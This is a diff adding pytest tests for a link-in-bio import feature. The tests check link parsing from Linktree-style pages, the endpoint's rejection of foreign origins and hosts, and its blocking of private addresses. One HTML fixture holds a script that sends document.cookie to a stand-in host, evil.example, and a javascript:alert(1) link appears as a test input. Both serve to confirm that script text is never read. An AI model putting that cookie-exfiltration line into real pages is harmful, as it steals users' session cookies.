@@ -487,6 +487,29 @@ def test_the_system_lookup_asks_for_tcp_on_443(monkeypatch):
     assert asked == [("linktr.ee", 443, {"type": socket.SOCK_STREAM, "proto": socket.IPPROTO_TCP})]
 
 
+def test_the_system_connect_uses_the_address_it_is_given(monkeypatch):
+    made = []
+
+    class Raw:
+        def __init__(self, family, kind):
+            self.calls = [("new", family, kind)]
+            made.append(self)
+
+        def settimeout(self, t):
+            self.calls.append(("timeout", t))
+
+        def connect(self, address):
+            self.calls.append(("connect", address))
+
+        def close(self):
+            self.calls.append(("close",))
+    monkeypatch.setattr(socket, "socket", Raw)
+    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **kw: pytest.fail("looked up"))
+    biofetch.system_connect(socket.AF_INET6, (PUBLIC6, 443, 0, 0), 4.5)
+    assert made[0].calls == [("new", socket.AF_INET6, socket.SOCK_STREAM), ("timeout", 4.5),
+                             ("connect", (PUBLIC6, 443, 0, 0))]
+
+
 # ---------------------------------------------------------------------------
 # One at a time, a few seconds apart
 # ---------------------------------------------------------------------------
@@ -529,3 +552,218 @@ def test_the_switch_is_off_by_default_and_saved_with_the_settings(env, client):
     assert config.load()["bio_import"] is True and biofetch.enabled(config.load())
     client.post("/api/config", json={"bio_import": False}, headers=H)
     assert not biofetch.enabled(config.load())
+
+
+# ---------------------------------------------------------------------------
+# Parsing (hand-written pages, shaped like what these sites serve)
+# ---------------------------------------------------------------------------
+
+ROUTES = {"instagram.com": "instaloader", "x.com": "gallery-dl", "twitter.com": "gallery-dl",
+          "youtube.com": "yt-dlp", "tiktok.com": "yt-dlp", "bsky.app": "gallery-dl"}
+
+# A Next.js link page: the links are in __NEXT_DATA__, the anchors drawn by
+# its scripts (which never run here).
+NEXT_PAGE = """<!DOCTYPE html><html><head><title>Alice | Linktree</title>
+<script>window.evil = function () { fetch("https://evil.example/" + document.cookie) }</script>
+<script id="__NEXT_DATA__" type="application/json">
+{"props": {"pageProps": {"account": {"username": "alice",
+  "socialLinks": [{"type": "INSTAGRAM", "url": "https://www.instagram.com/alice.example/"},
+                  {"type": "TIKTOK", "url": "https://www.tiktok.com/@new.one?lang=en"}],
+  "links": [{"title": "My shop", "url": "https://shop.example/alice"},
+            {"title": "X", "url": "https://x.com/Example_User1"},
+            {"title": "Videos", "url": "https://www.youtube.com/@alicevids/videos"},
+            {"title": "Latest", "url": "https://www.youtube.com/watch?v=abc"},
+            {"title": "Report", "url": "https://linktr.ee/s/about/trust-center/report"},
+            {"title": "nested", "deep": [[{"u": "HTTPS://bsky.app/profile/alice.bsky.social"}]]},
+            {"title": "not a link", "url": "instagram.com/notalink"}]}}}}
+</script></head><body><div id="__next"></div></body></html>"""
+
+ANCHOR_PAGE = """<html><body>
+<a href="https://instagram.com/alice.example">Instagram</a>
+<a href="https://www.instagram.com/alice.example/">Instagram again</a>
+<a href="https://x.com/example_user1/status/123">a post</a>
+<a href="https://twitter.com/example_user1">X</a>
+<a href="https://www.instagram.com/p/C8xYz/">a post</a>
+<a href="https://x.com/intent/follow?screen_name=alice">follow</a>
+<a href="https://tiktok.com/new.one">no @</a>
+<a href="mailto:alice@example.com">mail</a><a href="javascript:alert(1)">js</a><a href="/relative">rel</a>
+<area href="https://bsky.app/profile/alice.bsky.social">
+<a href="https://www.youtube.com/channel/UC1234567890abcdefghij/">channel</a>
+<a href="https://www.instagram.com/alice&#46;example/">entity</a>
+</body></html>"""
+
+
+def test_links_from_next_data():
+    links = biofetch.page_links(NEXT_PAGE)
+    assert "https://evil.example/" not in " ".join(links)              # script text is never read
+    assert "instagram.com/notalink" not in links
+    assert "HTTPS://bsky.app/profile/alice.bsky.social" in links
+    r = {(p[0], p[1]) for p in filter(None, (biofetch.profile(link, ROUTES) for link in links))}
+    assert r == {("instagram", "alice.example"), ("tiktok", "new.one"), ("twitter", "Example_User1"),
+                 ("youtube", "alicevids"), ("bluesky", "alice.bsky.social")}
+
+
+def test_links_from_anchors_and_what_is_not_a_profile():
+    links = biofetch.page_links(ANCHOR_PAGE)
+    assert not any(link.startswith(("mailto", "javascript", "/")) for link in links)
+    found = [biofetch.profile(link, ROUTES) for link in links]
+    profiles = [(f[0], f[1]) for f in found if f]
+    assert profiles == [("instagram", "alice.example"), ("instagram", "alice.example"),
+                        ("twitter", "example_user1"), ("bluesky", "alice.bsky.social"),
+                        ("youtube", "UC1234567890abcdefghij")]    # the &#46; one is the first, unescaped
+    refused = [link for link, f in zip(links, found) if not f]
+    assert refused == ["https://x.com/example_user1/status/123", "https://www.instagram.com/p/C8xYz/",
+                       "https://x.com/intent/follow?screen_name=alice", "https://tiktok.com/new.one"]
+
+
+@pytest.mark.parametrize("text", [
+    "", "<html>", "no markup at all", "<a href=", "<a href='https://x.com/a'", "<<<>>><!--", "<!", "<![CDATA[",
+    "<script id=__NEXT_DATA__>{not json", '<script type="application/json">' + "[" * 100000,
+    "\x00\x01<a href='https://x.com/ok'>", "<a href=\"https://x.com/fine\"><b><i></a></b>",
+])
+def test_malformed_pages_give_what_they_can(text):
+    links = biofetch.page_links(text)
+    assert links in ([], ["https://x.com/ok"], ["https://x.com/fine"])
+
+
+def test_links_are_bounded():
+    page = "".join(f'<a href="https://x.com/u{i}">' for i in range(5000))
+    assert len(biofetch.page_links(page)) == biofetch.MAX_LINKS
+    blob = '<script type="application/json">' + json_list(300_000) + "</script>"
+    assert len(biofetch.page_links(blob)) < 300_000
+
+
+def json_list(n):
+    import json
+    return json.dumps(["https://x.com/j%d" % i for i in range(n)])
+
+
+# ---------------------------------------------------------------------------
+# The endpoint, end to end with a fake fetcher
+# ---------------------------------------------------------------------------
+
+def bio_net(page, path="/alice"):
+    return Net(pages={("linktr.ee", path): html_answer(page.encode())})
+
+
+@pytest.fixture
+def bio(env, client, monkeypatch):
+    """Alice (alice.example linked), Bob (bob.example), X example_user1 and
+    TikTok example_user6 indexed and linked to nobody; the switch on."""
+    from test_people import archive, account, create, post
+    archive(env)
+    alice = create(client, "Alice", account(client, "instagram", "alice.example"))["person"]
+    create(client, "Bob", account(client, "instagram", "bob.example"))
+    post(client, "/api/config", {"bio_import": True})
+    monkeypatch.setattr(biofetch, "MIN_GAP", 0)
+    return alice
+
+
+def bio_import(client, pid, url="https://linktr.ee/alice", status=200, headers=H):
+    r = client.post(f"/api/people/{pid}/bio-import", json={"url": url}, headers=headers)
+    assert r.status_code == status, r.get_json()
+    return r.get_json()
+
+
+def test_import_end_to_end(bio, client, monkeypatch):
+    from test_people import post
+    post(client, "/api/sources", {"target": "https://bsky.app/profile/alice.bsky.social"})   # a source of nobody
+    net = bio_net(NEXT_PAGE + ANCHOR_PAGE)
+    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
+    r = bio_import(client, bio["id"])
+    assert r["ok"] and r["url"] == "https://linktr.ee/alice"
+    got = {(a["platform"], a["handle"]): a for a in r["accounts"]}
+    assert {k: a["status"] for k, a in got.items()} == {
+        ("instagram", "alice.example"): "linked", ("tiktok", "new.one"): "new",
+        ("twitter", "example_user1"): "indexed", ("youtube", "alicevids"): "new",
+        ("bluesky", "alice.bsky.social"): "source", ("youtube", "UC1234567890abcdefghij"): "new"}
+    # Anchors come first: twitter.com/example_user1, and x.com/Example_User1 from the JSON is the same one.
+    x = got["twitter", "example_user1"]
+    assert x["account"]["id"] == "641286" and x["person"] is None and x["url"] == "https://twitter.com/example_user1"
+    assert got["instagram", "alice.example"]["person"] == {"id": bio["id"], "name": "Alice"}
+    assert got["instagram", "alice.example"]["url"] == "https://instagram.com/alice.example"
+    assert got["tiktok", "new.one"]["url"] == "https://tiktok.com/@new.one"         # query dropped
+    # shop.example, the X post, the Instagram post, the intent link, tiktok.com/new.one, the YouTube video
+    assert r["other"] == 6
+    assert net.connects == [PUBLIC]
+    # Nothing was added.
+    from test_people import get, links
+    assert links() == [("Alice", "instagram", "111"), ("Bob", "instagram", "222")]
+    before = len(get(client, "/api/sources")["sources"])
+    assert before == 1
+
+    # The user adds two, through the usual calls; the next import says so.
+    post(client, f"/api/people/{bio['id']}/accounts", {"add": [{"platform": "twitter", "id": "641286"}]})
+    post(client, "/api/sources", {"target": got["tiktok", "new.one"]["url"], "person": bio["id"]})
+    r = bio_import(client, bio["id"])
+    status = {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]}
+    assert status["twitter", "example_user1"] == status["tiktok", "new.one"] == "linked"
+
+
+def test_an_account_of_someone_else(bio, client, monkeypatch):
+    page = '<a href="https://instagram.com/bob.example">bob</a><a href="https://www.tiktok.com/@example_user6">t</a>'
+    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
+    r = bio_import(client, bio["id"])
+    [bob, tiktok] = r["accounts"]
+    assert bob["status"] == "other" and bob["person"]["name"] == "Bob" and bob["account"]["id"] == "222"
+    assert tiktok["status"] == "indexed" and tiktok["account"]["handle"] == "example_user6"
+
+
+def test_an_empty_page(bio, client, monkeypatch):
+    monkeypatch.setattr(biofetch, "FETCHER", bio_net("").fetcher())
+    assert bio_import(client, bio["id"]) == {"ok": True, "url": "https://linktr.ee/alice", "accounts": [],
+                                            "other": 0}
+
+
+class Untouchable:
+    def fetch(self, url):
+        raise AssertionError("fetched")
+
+
+def test_switched_off_nothing_is_fetched(env, client, monkeypatch):
+    from test_people import create
+    p = create(client, "Alice")["person"]
+    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
+    r = bio_import(client, p["id"], status=403)
+    assert r == {"ok": False, "error": "link-in-bio import is off: turn it on in Settings → Downloads"}
+
+
+def test_refusals_from_the_endpoint(bio, client, monkeypatch):
+    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
+    assert bio_import(client, 999, status=404)["error"] == "no such person"
+    for body in (None, {}, {"url": 3}, {"url": "https://linktr.ee/a", "extra": 1}, ["https://linktr.ee/a"]):
+        r = client.post(f"/api/people/{bio['id']}/bio-import", json=body, headers=H)
+        assert r.status_code == 400
+    assert "not an allowed site" in bio_import(client, bio["id"], "https://evil.example/a", status=400)["error"]
+    assert bio_import(client, bio["id"], "http://linktr.ee/a", status=400)["error"] == "only https links"
+    for foreign in ({"Origin": "https://www.instagram.com"}, {"Sec-Fetch-Site": "cross-site"}):
+        r = bio_import(client, bio["id"], headers={**H, **foreign}, status=403)
+        assert "own dashboard" in r["error"]
+    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"})
+    assert r.status_code == 403                                             # no X-FeedVault
+    r = client.post(f"/api/people/{bio['id']}/bio-import", json={"url": "https://linktr.ee/a"}, headers={**H, "Host": "evil.example"})
+    assert r.status_code == 403 and r.get_json()["error"] == "forbidden host"
+
+
+def test_a_failed_fetch_is_a_502_with_its_reason(bio, client, monkeypatch, capsys):
+    net = Net(dns={"linktr.ee": ["10.0.0.1"]})
+    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
+    r = bio_import(client, bio["id"], status=502)
+    assert r["error"] == "linktr.ee's address is not public (10.0.0.1)"
+    out = capsys.readouterr().out
+    assert "link-in-bio import of https://linktr.ee/alice: linktr.ee's address is not public" in out
+
+
+def test_the_page_is_never_logged(bio, client, monkeypatch, capsys):
+    secret = "<a href='https://x.com/example_user1'>SECRET-PAGE-TEXT</a>"
+    monkeypatch.setattr(biofetch, "FETCHER", bio_net(secret).fetcher())
+    bio_import(client, bio["id"])
+    out = capsys.readouterr()
+    assert "SECRET-PAGE-TEXT" not in out.out + out.err
+    assert "https://linktr.ee/alice: 1 accounts, 0 other links" in out.out
+
+
+def test_busy_is_a_429(bio, client, monkeypatch):
+    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
+    with biofetch._busy:
+        assert "another" in bio_import(client, bio["id"], status=429)["error"]
